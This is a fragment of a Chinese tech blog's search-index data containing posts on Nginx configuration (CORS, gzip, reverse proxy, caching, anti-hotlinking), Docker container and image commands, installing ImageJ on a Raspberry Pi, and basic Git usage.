"readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Nginx 常用配置",url:"/posts/30985643.html",text:"配置跨域下述的 add_header 末尾都可以加上了 always，它表示不管 HTTP 返回状态码是多少都会使 add_header 生效，有些时候服务端可能会返回 4XX 的 HTTP 状态码，这时候如果少了 always 会导致 add_header 失效，从而导致浏览器报跨域错误。 123456789101112location / { add_header 'Access-Control-Allow-Origin' '*' always; add_header 'Access-Control-Allow-Credentials' 'true' always; add_header 'Access-Control-Allow-Methods' 'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS' always; add_header 'Access-Control-Allow-Headers' 'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin' always; if ($request_method = 'OPTIONS') { return 204; } ...} 或者使用通配符，允许所有头部、所有域、所有方法跨域，存在安全隐患（不推荐使用） 123456789101112location / { add_header 'Access-Control-Allow-Origin' '*' always; add_header 'Access-Control-Allow-Headers' '*' always; add_header 'Access-Control-Allow-Methods' '*' always; add_header 'Access-Control-Allow-Credentials' 'true' always; if ($request_method = 'OPTIONS') { return 204; } ...} 通过 CURL 命令测试配置是否生效 123456789101112131415$ curl -I http://www.example.com/slider.e37972.js# 测试结果HTTP/1.1 200 OKServer: Nginx/2.2.3Date: Tue, 25 Dec 2018 17:59:53 GMTContent-Type: application/javascriptContent-Length: 53386Last-Modified: Tue, 25 Dec 2018 17:56:47 GMTConnection: keep-aliveAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: trueAccess-Control-Allow-Methods: GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONSAccess-Control-Allow-Headers: Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,OriginAccept-Ranges: bytes 删除指定的 Heder相关指令： proxy_set_header is to set a request header add_header is to add header to response proxy_hide_header is to hide a response header 如果要替换响应中已经存在的 Header，仅仅使用 add_header 是不够的，因为它将堆叠值（堆叠来自服务器和自己添加的 Header），所以必须分两步执行操作： 删除 Header：proxy_hide_header Access-Control-Allow-Origin; 添加自定义 Header：add_header Access-Control-Allow-Origin \"*\" always; 假设需要删除响应中已存在的跨域 Header，然后往响应中添加自定义的跨域 Header，配置示例如下： 123456789101112131415161718location / { proxy_hide_header Access-Control-Allow-Origin; proxy_hide_header Access-Control-Allow-Methods; proxy_hide_header Access-Control-Allow-Headers; proxy_hide_header Access-Control-Allow-Credentials; add_header 'Access-Control-Allow-Origin' '*' always; add_header 'Access-Control-Allow-Credentials' 'true' always; add_header 'Access-Control-Allow-Methods' 'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS' always; add_header 'Access-Control-Allow-Headers' 'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin' always; proxy_pass http://example.com; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr;} 配置 GZip 压缩1234567891011http { gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_comp_level 3; gzip_vary off; gzip_disable \"MSIE [1-6]\\.\"; gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss application/javascript; ...} 1234567891011# 通过curl命令测试配置是否生效$ curl -I -H \"Accept-Encoding: gzip, deflate\" http://www.example.com/slider.e37972.js# 测试结果HTTP/1.1 200 OKServer: Nginx/2.2.3Date: Tue, 25 Dec 2018 17:54:06 GMTContent-Type: application/javascriptLast-Modified: Tue, 25 Dec 2018 17:52:31 GMTConnection: keep-aliveContent-Encoding: gzip Nginx 反向代理配置123456789101112131415161718192021http { upstream applications { server 192.168.68.43:8081 weight=1; server 192.168.68.45:8082 weight=1; } server { listen 80; server_name localhost; location / { proxy_pass http://applications; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-Port $remote_port; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } }} 配置 Web 静态资源的浏览器端缓存123456789101112131415161718192021server { root /home/wwwroot/hexo-blog; location ~ .*\\.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|svgz|mp4|ogg|ogv|webm|eot|ttf|woff|woff2)$ { expires 7d; } location ~ .*\\.(?:js|css)$ { expires 7d; } location ~ .*\\.(?:htm|html)$ { # 根据具体的项目业务，决定是否需要配置浏览器端的静态页面缓存，以下配置表示是不缓存任何Html页面 add_header Cache-Control \"private, no-store, no-cache, must-revalidate, proxy-revalidate\"; } ...} Nginx 利用 Referer 指令实现防盗链语法说明12345678910语法: valid_referers none | blocked | server_names | string …;配置段: server, location指定合法的来源'referer', 他决定了内置变量$invalid_referer的值，如果referer头部包含在这个合法网址列表中，这个变量被设置为0，否则设置为1. 不区分大小写。参数说明：none \"Referer\" 为空blocked \"Referer\"不为空，但是里面的值被代理或者防火墙删除了，这些值都不以http://或者https://开头，而是\"Referer: XXXXXXX\"这种形式server_names \"Referer\"来源头部包含当前的server_names（当前域名）arbitrary string 任意字符串,定义服务器名或者可选的URI前缀.主机名可以使用*开头或者结尾，在检测来源头部这个过程中，来源域名中的主机端口将会被忽略掉regular expression 正则表达式,~表示排除https://或http://开头的字符串. 两种配置案例123456789101112# 配置案例一：限制来源只能是none、blocked、主机域名、百度、谷歌、必应location ~* \\.(gif|jpg|png|webp)$ { valid_referers none blocked *.baidu.com *.google.com *.bing.com server_names ~\\.baidu\\. ~\\.google\\. ~\\.bing\\.; if ($invalid_referer) { return 403; } root /opt/www/image;} 12345678910111213# 配置案例二：屏蔽所有来自指定域名（例如搜狗）的访问location ~* \\.(gif|jpg|png|webp)$ { valid_referers sogou.com *.sogou.com ~\\.sogou\\.; # 此处必须是匹配空字符串 if ($invalid_referer = ''){ return 403; } root /opt/www/image;} 测试配置是否生效123456789101112131415161718192021222324252627282930313233343536# 通过curl命令测试配置是否生效，强烈建议额外测试referer字段为空字符串或者无此字段的请求$ curl -v -k -I --referer https://www.sogou.com https://example.com* About to connect() to www.example.com port 443 (#0)* Trying www.example.com...* Connected to www.example.com (14.215.177.38) port 443 (#0)* Initializing NSS with certpath: sql:/etc/pki/nssdb* skipping SSL peer certificate verification* SSL connection using TLS_RSA_WITH_AES_256_CBC_SHA256* Server certificate:* subject: CN=www.example.cn* start date: 3月 19 00:00:00 2019 GMT* expire date: 3月 18 12:00:00 2020 GMT* common name: www.example.cn* issuer: CN=TrustAsia TLS RSA CA,OU=Domain Validated SSL,O=\"TrustAsia Technologies, Inc.\",C=CN&gt; HEAD / HTTP/1.1&gt; User-Agent: curl/7.29.0&gt; Host: www.example.com&gt; Accept: */*&gt; Referer: https://www.sogou.com&gt;&lt; HTTP/1.1 403 ForbiddenHTTP/1.1 403 Forbidden&lt; Server: Nginx/2.2.3Server: Nginx/2.2.3&lt; Date: Thu, 02 Jan 2020 23:38:13 GMTDate: Thu, 02 Jan 2020 23:38:13 GMT&lt; Content-Type: text/htmlContent-Type: text/html&lt; Content-Length: 612Content-Length: 612&lt; Connection: keep-aliveConnection: keep-alive&lt;* Connection #0 to host www.example.com left intact Nginx 放宽 GET 请求中 URL 的最大长度限制 client_header_buffer_size 的默认值： client_header_buffer_size 1k large_client_header_buffers 的默认值： large_client_header_buffers 4 4k 123456789http { include mime.types; default_type application/octet-stream; client_header_buffer_size 512k; large_client_header_buffers 4 1m; ...} Nginx 反向代理响应超时解决方案Nginx 访问出现 504 Gateway Time-out，这一般是由于程序执行时间过长导致响应超时，例如程序需要执行 90 秒，而 Nginx 最大响应等待时间为 30 秒，这样就会出现超时。 12345location / { proxy_connect_timeout 1800s; #Nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 1800s; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 1800s; #连接成功后，后端服务器响应时间(代理接收超时)} Nginx 反向代理设置响应端口Nginx 默认反向代理后的端口为 80，因此存在取被代理后的端口为 80 的问题，这就可能会导致业务逻辑出错；主要原因是在 Nginx 的配置文件中， 配置 Host 属性时没有设置响应的端口。 1234567891011121314server { listen 8080; location /ime-server { proxy_pass http://ime-server/ime-server; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ...} 在如上的配置内容中，Host 属性只配置了 $host，没有对应的 port，这就导致在被代理的地方取得错误的端口，以 Java 代码为例： 1234String scheme = httpRequest.getScheme();String serverName = httpRequest.getServerName();int port = httpRequest.getServerPort();String requestURI = scheme+\"://\"+serverName+\":\"+port+\"/ime-server/rest/\"+serviceName+\"/wmts\"; 这时，Java 代码取得的 port 为 80，即使 Nginx 监听的端口为 8080。此时需要修改 Nginx 的配置文件，将 Host 属性后面的配置内容改为 $host:$server_port，配置示例如下： 1234567891011121314server { listen 8080; location /ime-server { proxy_pass http://ime-server/ime-server; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ...} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"web服务器"},{title:"Docker 之三 Docker 容器管理命令",url:"/posts/99d66af5.html",text:'Docker 新建并启动容器1234567891011121314151617# 语法# docker run [OPTIONS] IMAGE [COMMAND] [ARG...]# 新建并以交互式启动centos容器，并为容器重新分配一个伪输入终端，同时指定容器名称# docker run -it --name="centos" centos /bin/bash# 新建并后台启动centos容器，如果启动后的容器内部没有前台运行的进程，容器默认会马上停止# docker run -d centos# 参数OPTIONS# --name="new-name" 或者 --name new-name：为容器指定一个名称，该名称会在执行"docker ps"的时候显示出来# -d：后台启动容器，并返回容器ID，即启动守护式容器# -i：以交互式运行容器，通常与-t同时使用# -t：为容器重新分配一个伪输入终端，通常与-i同时使用# -P：随机端口映射# -p：指定端口映射，有四种格式：ip:hostport:containerport、ip::containerport、hostport:containerport、containerport# --privileged=true：使用该参数指定容器内的root拥有真正的root权限，false代表容器内的root只拥有外部宿主机的一个普通用户权限 Docker 容器的重启策略123456789101112131415# --restart=no：表示当容器退出时不要自动重启，no是默认值# --restart=always：表示不管容器以什么退出状态码退出，总是尝试重启容器# --restart=on-failure:5：表示当容器以非0退出状态码退出时尝试重启容器，且最大尝试重启次数为5# --restart=unless-stopped – 表示不管容器以什么退出状态码退出，总是尝试重启容器；不过当daemon启动时，如果发现容器之前已经处于退出状态，则不会尝试启动容器# 设置容器重启策略为on-failure，且最大尝试重启次数为5# docker run -it --restart=on-failure:5 --name="centos" centos /bin/bash# 获取容器的重启次数# docker inspect -f "{{ .RestartCount }}" centos0# 获取容器上一次重启的时间# docker inspect -f "{{ .State.StartedAt }}" centos2019-01-27T03:54:44.510836372Z Docker 列出当前正在运行的容器123456789101112131415161718# 语法# docker ps [OPTIONS]# 显示当前正在运行的容器# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES04c9fdf618f6 1e1148e4cc2c "/bin/bash" 5 minutes ago Up 4 minutes hardcore_leavitt# 更改容器名称# docker rename old_container_name new_container_name# 参数OPTIONS# -a：显示所有正在运行的容器，包括历史上运行过的# -l：显示最近创建的容器# -n：列出最近创建的n个容器，例如“-n 5”# -s：显示总的文件大小# -q：静默模式，只显示容器编号# --no-trunc：不截断输出 Docker 断开与当前容器的连接12345678# 当以交互式启动容器时，容器停止，断开连接# exit# 当以交互式启动容器时，容器不停止，断开连接，使用以下组合快捷键ctrl + p + q# 当以后台方式启动容器时，直接断开连接即可，容器默认不会停止# exit Docker 在运行的容器中执行命令12345678910111213141516# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker exec [OPTIONS] CONTAINER COMMAND [ARG...]# 在ID为1a3941b6ae8e的容器中，开启一个交互模式的伪输入终端# docker exec -it 1a3941b6ae8e /bin/bash# 在ID为1a3941b6ae8e的容器中，以交互模式执行容器内的/root/monitor.sh脚本# docker exec -it 1a3941b6ae8e /bin/bash /root/monitor.sh# 在ID为1a3941b6ae8e的容器中，执行查询系统时间的命令# docker exec -t 1a3941b6ae8e date# 参数OPTIONS# -d：守护式运行，即在后台运行# -i：以交互式运行容器，通常与-t同时使用# -t：为容器重新分配一个伪输入终端，通常与-i同时使用 Docker 连接到正在运行的容器1234567891011# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker attach [OPTIONS] CONTAINER# 连接到ID为1a3941b6ae8e的容器# docker attach 1a3941b6ae8e# 或者执行以下命令，在ID为1a3941b6ae8e的容器中，开启一个交互模式的伪输入终端（推荐此方式）# docker exec -it 1a3941b6ae8e /bin/bash# 参数OPTIONS# --sig-proxy=false：确保CTRL-D或CTRL-C不会关闭容器 Docker 启动、重启、停止、强制停止容器1234567891011121314151617# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker start [OPTIONS] CONTAINER [CONTAINER...]# docker restart [OPTIONS] CONTAINER [CONTAINER...]# docker stop [OPTIONS] CONTAINER [CONTAINER...]# docker kill [OPTIONS] CONTAINER [CONTAINER...]# 启动ID为1a3941b6ae8e的容器# docker start 1a3941b6ae8e# 重启ID为1a3941b6ae8e的容器# docker restart 1a3941b6ae8e# 停止ID为1a3941b6ae8e的容器# docker stop 1a3941b6ae8e# 强制停止ID为1a3941b6ae8e的容器# docker kill 1a3941b6ae8e Docker 删除容器12345678910111213141516171819# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker rm [OPTIONS] CONTAINER [CONTAINER...]# 删除ID为1a3941b6ae8e的容器# docker rm 1a3941b6ae8e# 强制删除ID为1a3941b6ae8e的容器，即使容器正在运行# docker rm -f 1a3941b6ae8e# 批量删除容器，第一种写法# docker rm $(docker ps -aq)# 批量删除容器，第二种写法# docker ps -aq | xargs docker rm# 参数OPTIONS# -f：通过SIGKILL信号强制删除一个运行中的容器# -l：移除容器间的网络连接，而非容器本身# -v：删除与容器关联的卷 Docker 显示容器内部的日志信息123456789101112131415161718# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker logs [OPTIONS] CONTAINER# 显示ID为1a3941b6ae8e的容器的内部日志信息# docker logs 1a3941b6ae8e# 跟踪显示ID为1a3941b6ae8e的容器的内部日志信息# docker logs -t -f --tail 5 1a3941b6ae8e# 停止日志输出，使用以下组合快捷键ctrl + c# 参数OPTIONS# -t：加入时间戳# -f：跟踪最新的日志打印# --since：显示某个开始时间的所有日志# --until：显示某个结束时间之前的所有日志# --tail：仅列出最新的N条日志，例如 --tail 5 Docker 显示容器内部运行的进程12345# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker top CONTAINER [ps OPTIONS]# 显示ID为1a3941b6ae8e的容器的内部进程# docker top 1a3941b6ae8e Docker 容器与宿主机互相拷贝文件12345678910# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-# docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH# 从ID为1a3941b6ae8e的容器中，拷贝文件/root/anaconda-ks.cfg到宿主机的/root目录下# docker cp 1a3941b6ae8e:/root/anaconda-ks.cfg /root# 将宿主机的/root/monitor.log文件，拷贝到ID为1a3941b6ae8e的容器的/root目录下# docker cp /root/monitor.log 1a3941b6ae8e:/root Docker 显示容器的内部细节12345678910# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker inspect [OPTIONS] NAME|ID [NAME|ID...]# 显示ID为1a3941b6ae8e的容器的内部细节# docker inspect 1a3941b6ae8e# 参数OPTIONS# -f：指定返回值的模板文件# -s：显示总的文件大小# --type：返回指定类型的JSON Docker 新建并启动 Tomcat 容器1234567891011121314151617181920# 下载最新的Tomcat镜像（可能基于Debian/Alpine/Centos、依赖OpenJDK）# docker pull tomcat# 前台方式新建并启动Tomcat容器，指定映射端口# docker run -it -p 8888:8080 --name="tomcat8.5" tomcat# 前台方式新建并启动Tomcat容器，随机映射端口# docker run -it -P --name="tomcat8.5" tomcat# 前台方式新建并启动Tomcat容器，可以使用快捷键断开连接，不停止Tomcat容器ctrl + p + q# 后台方式新建并启动Tomcat容器，指定映射端口# docker run -d -p 8888:8080 --name="tomcat8.5" tomcat# 后台方式新建并启动Tomcat容器，随机映射端口# docker run -d -P --name="tomcat8.5" tomcat# 无论前台还是后台方式启动Tomcat容器，都可以执行以下命令连接到Tomcat容器，进一步配置Tomcat服务器# docker exec -it tomcat8.5 /bin/bash Docker 提交容器副本，生成新的 Docker 镜像12345678910111213141516# 语法，参数CONTAINER值可以是容器ID或者容器名称# docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]# 提交容器副本作为一个新的镜像# docker commit -a "peter@163.com" -m "first commit" 1a3941b6ae8e peter/mytomcat:8.5# 查看刚创建的新镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/mytomcat 8.5 1ca4c9763049 16 seconds ago 475MB# 参数OPTIONS# -a：提交镜像的作者# -c：使用Dockerfile指令来创建镜像# -m：提交时的说明文字# -p：在commit的时候暂停容器，默认选项 Docker 新建并后台启动容器的介绍一. Docker 新建并后台启动容器（“docker run -d xxxx”），然后通过命令”docker ps -a” 进行查看，会发现容器已经退出；这里必须注意的是，Docker 容器后台启动之后，就必须有一个前台进程。容器启动的命令，如果不是那些一直挂器起的命令（top、tail），默认就是会自动停止。 二。以 Nginx 为例，正常情况下配置启动服务只需要启动相应的 Service 即可，例如执行命令”systemctl start nginx”。但是这样做，Nginx 如果以后台进程模式运行，会导致 Docker 前台没有运行的应用；这样的容器在后台启动后，会立即自杀，因为容器觉得自身没事可做了；这一点与 Supervistor 配置程序后台运行很相似。所以，最佳的解决方案是将需要运行的程序以前台进程的形式运行。 三。实践操作 12345678910111213141516# 新建并后台启动centos容器，并在前台执行指定的shell脚本# docker run -d centos /bin/sh -c "while true;do echo hello docker;sleep 2;done"1a3941b6ae8e# 显示当前正在运行的容器，发现刚才以后台方式启动的容器不会再自动停止# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1a3941b6ae8e centos "/bin/sh -c \'while t…" 11 minutes ago Up 11 minutes infallible_haslett# 跟踪显示ID为1a3941b6ae8e的容器的内部日志信息# docker logs -f -t --tail 5 1a3941b6ae8e2018-12-24T19:06:07.180718501Z hello docker2018-12-24T19:06:09.185193606Z hello docker2018-12-24T19:06:11.189919184Z hello docker2018-12-24T19:06:13.193004892Z hello docker2018-12-24T19:06:15.196940992Z hello docker Docker 常用命令图解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之二 Docker 镜像管理命令",url:"/posts/77134a0f.html",text:'Docker 帮助命令123456789101112# 查看Docker的版本# docker version# 查看Docker的详细信息# docker info# 查看Docker的命令帮助手册# docker --help# 查看Docker具体某个操作的命令帮助手册# docker images --help# docker search --help Docker 镜像查看命令1234567891011121314# 语法# docker images [OPTIONS] [REPOSITORY[:TAG]]# 查看本地所有镜像的列表# docker images# 查看本地某个镜像的信息# docker images centos# 参数OPTIONS# -a：列出本地所有的镜像（含中间映像层）# -q：只显示本地所有镜像的镜像ID# --no-trunc：不截断输出# --digests：显示镜像的摘要信息 Docker 镜像搜索命令12345678910111213# 语法# docker search [OPTIONS] TERM# 搜索Docker-Hub中的镜像# docker search tomcat# 参数OPTIONS# --no-trunc：不截断输出# --limit：限制搜索结果的条目数量，默认值是25，例如“--limit 15”# --filter：加上过滤条件进行搜索# --filter=stars=3：列出点赞数不小于指定值的镜像# --filter "is-official=true"： 只列出Docker官方发布的镜像# --filter "is-automated=true"： 只列出automated build类型的镜像 Docker 镜像下载命令123456789101112# 语法# docker pull [OPTIONS] NAME[:TAG|@DIGEST]# 下载Tomcat镜像，默认下载latest版本# docker pull tomcat# 下载指定版本的Tomcat镜像# docker pull tomcat:8.0# 参数OPTIONS# -a：拉取所有tagged镜像# --disable-content-trust：忽略镜像的校验，默认开启 Docker 镜像删除命令123456789101112131415161718192021# 语法# docker rmi [OPTIONS] IMAGE [IMAGE...]# 删除指定的镜像，默认删除latest版本# docker rmi hello-world# 强制删除指定的镜像，默认删除latest版本# docker rmi -f hello-world# 根据镜像ID删除镜像# docker rmi 4ab4c602aa5e# 删除多个镜像，默认删除latest版本# docker rmi tomcat nginx# 删除本地所有镜像# docker rmi $(docker images -qa)# 参数OPTIONS# -f：强制删除，即使镜像对应的容器实例正在运行# --no-prune：不移除该镜像的过程镜像，默认移除 批量删除镜像12# 清理所有不被使用的镜像，正在使用的镜像和容器不会被删除，但是这个命令切忌慎用，因为它把整个docker空间都释放掉，即所有不被正在使用的镜像和容器都会被删除# docker system prune -a 构建 Docker 镜像12# 根据指定的Dockerfile构建新的镜像，peter/centos是新镜像的名称，1.1是tag（版本号）# docker build -f ~/dockerfile-centos -t peter/centos:1.1 . Docker 命令帮助手册推荐菜鸟教程 - Docker 命令大全 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"基于树莓派安装 ImageJ",url:"/posts/67ba58dd.html",text:'ImageJ 介绍 一个基于 Java 的公共的图像处理软件 ImageJ Github Repo ImageJ WiKi ImageJ 安装1234567891011121314151617181920212223242526272829# 硬件： Raspberry 3B# 系统： Raspbian-Stretch（基于Debian-Stretch）# 更新系统（可省略）# apt-get update# apt-get upgrade# apt-get clean# 查看当前JDK的版本号（官方最新的Raspbian系统默认已安装Open-JDK8）# java -version# 下载Fiji-nojre，并解压# cd /home/pi/Downloads# wget http://downloads.imagej.net/fiji/latest/fiji-nojre.zip# unzip fiji-nojre.zip# 下载ImageJ脚本，并授权执行# cd /home/pi/Downloads# git clone https://github.com/imagej/imagej.git# cd /home/pi/Downloads/imagej/bin# chmod +x ImageJ.sh# 拷贝Fiji的Jar包到ImageJ目录下# cd /home/pi/Downloads# cp -r Fiji.app/jars imagej/# 运行ImageJ# cd /home/pi/Downloads/imagej/bin# ./ImageJ.sh 参考文献 https://imagej.net/Raspberry_Pi https://imagej.net/Fiji/Downloads#Installation https://imagej.nih.gov/ij/docs/install/linux.html https://groups.google.com/forum/#!topic/fiji-devel/eIF82i4shC0 http://forum.imagej.net/t/how-to-run-fiji-at-raspberry-pi-3/4743/11 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"树莓派"},{title:"互联网时代下的架构殿堂之路",url:"/posts/a570a16.html",text:'架构思维：互联网架构升级演进 架构进阶：互联网架构之升级改造 架构突破：高可用弹性伸缩的云架构之迁移改造 架构殿堂：高可用弹性伸缩的云架构之高并发实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"Git 之一 Git 常用命令",url:"/posts/e3228f73.html",text:'Git 的四个工作区域 Git 初始化本仓库123456789101112131415161718192021222324252627282930313233# 创建本地测试库的目录$ mkdir test_repo$ cd test_repo# 初始化本地库$ git init# 初始化后的目录结构$ tree -al ../test_repotest_repo/└── .git ├── branches ├── config ├── description ├── HEAD ├── hooks │&nbsp;&nbsp; ├── applypatch-msg.sample │&nbsp;&nbsp; ├── commit-msg.sample │&nbsp;&nbsp; ├── post-update.sample │&nbsp;&nbsp; ├── pre-applypatch.sample │&nbsp;&nbsp; ├── pre-commit.sample │&nbsp;&nbsp; ├── prepare-commit-msg.sample │&nbsp;&nbsp; ├── pre-push.sample │&nbsp;&nbsp; ├── pre-rebase.sample │&nbsp;&nbsp; └── update.sample ├── info │&nbsp;&nbsp; └── exclude ├── objects │&nbsp;&nbsp; ├── info │&nbsp;&nbsp; └── pack └── refs ├── heads └── tags Git 配置签名（本地库）这里的签名仅仅是为了方便标识提交代码的作者身份，并不用于 Git 远程库（Github）的身份认证（例如 Github 登录） 局部 12345678910111213141516171819202122$ cd git_test# 查看命令帮助手册$ git config --help# 配置仓库级别签名，仅在当前本地库范围内有效$ git config user.name peter$ git config user.email peter@gmail.com# 仓库级别签名配置信息的保存位置$ cat .git/config[user] name = peter email = peter@gmail.com# 查看当前仓库级别签名$ git config --get user.name$ git config --get user.email# 重置当前仓库级别签名$ git config --unset user.name$ git config --unset user.email 全局 12345678910111213141516171819202122# 配置系统用户级别签名（全局有效）$ git config --global user.name peter_glb$ git config --global user.email peter@gmail.com# 系统用户级别签名配置信息的保存位置$ cat ~/.gitconfig[user] name = peter_glb email = peter@gmail.com# 查看系统用户级别签名$ git config --global --get user.name$ git config --global --get user.email# 重置系统用户级别签名$ git config --global --unset user.name$ git config --global --unset user.email# 签名级别优先级说明# 就近原则，仓库级别签名优先于系统用户级别签名，二者都有时采用仓库级别签名# 如果只存在系统用户级别签名，则以系统用户级别签名为准# 二者不允许同时为空 Git 操作新建的文件（本地库）1234567891011121314151617# 显示工作区和暂存区的状态$ git status# 添加新文件到暂存区，建立文件跟踪$ git add api.json# 将新文件从暂存区撤出，取消文件跟踪$ git rm --cached api.json# 批量将新文件添加到暂存区$ git add --all# 将新文件从暂存区提交到本地库，并指定提交的备注信息$ git commit api.json -m \'create message\'# 或者批量将新文件从暂存区提交到本地库，并指定提交的备注信息$ git commit -am "create message" Git 操作修改过的文件（本地库）12345678910111213141516171819# 将已提交到本地库，且在本地修改过的文件（未提交到暂存区），直接丢弃工作区的改动还原为修改前的内容$ git checkout -- api.json# 将已提交到本地库，且在本地修改过的文件再次提交到暂存区# 这里可以执行“git commit”直接提交到本地库，省略"git add"操作，但这样就不能从暂存区撤回修改前的内容$ git add api.json# 将已提交到本地库，且在本地修改过与提交到暂存区的文件，从暂存区撤出$ git reset HEAD api.json# 批量将已提交到本地库，且在本地修改过的文件再次提交到暂存区# 这里可以执行“git commit”直接提交到本地库，省略"git add"操作，但这样以后就不能从暂存区恢复数据，强烈不建议使用$ git add --all# 将已提交到本地库，且在本地修改过与提交到暂存区的文件，再次提交到本地库$ git commit api.json -m \'update message\'# 批量将已提交到本地库，且在本地修改过与提交到暂存区的文件，再次提交到本地库$ git commit -am "update message" Git 忽略追踪已提交过的文件与文件夹123456789101112131415# 创建.gitignore文件$ touch .gitignore# 编辑.gitignore文件，然后添加需要被忽略提交的文件或者文件夹的路径$ vim .gitignore# .gitignore只能忽略那些原来没有被追踪的文件，如果某些文件已经被纳入了版本管理中（即已经被commit过），那么通过.gitignore文件是无法实现忽略提交的# 此时需要先把本地缓存删除（改变成未追踪状态）再重新提交，如文件或者文件夹删除不掉，可以加上 -f 参数强制删除，但是一定要加上 --cached 表示只删除缓冲文件# 若忽略提交的是文件夹，必须可以加上 -r 参数，表示忽略提交文件夹下的所有文件$ git rm --cached shop.cpp$ git rm -f --cached shop.cpp$ git rm -r -f --cached store/# 提交$ git add --all &amp;&amp; git commit -am \'Cancel tracking file\' Git 设置代理1234567891011121314151617# 设置当前仓库的HTTP代理$ git config http.proxy http://192.168.1.122:1080# 